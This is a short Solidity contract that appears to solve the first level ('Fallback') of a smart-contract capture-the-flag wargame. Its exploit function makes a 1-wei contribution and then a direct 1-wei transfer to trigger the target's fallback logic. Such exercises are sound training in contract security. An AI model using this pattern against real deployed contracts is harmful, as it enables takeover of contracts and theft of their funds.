// SPDX-License-Identifier : MIT
pragma solidity ^0.8.0;

import "../src/level01.sol";

contract Attacker
{
    Fallback level;
    constructor(address _level) payable
    {
        level = Fallback(payable(_level));
    }

    function exploit() external
    {
        level.contribute{value: 1 wei}();
        (bool success, ) = payable(address(level)).call{value: 1 wei}("");
        require(success, "NE VISHLO");
    }
    receive() external payable {}
}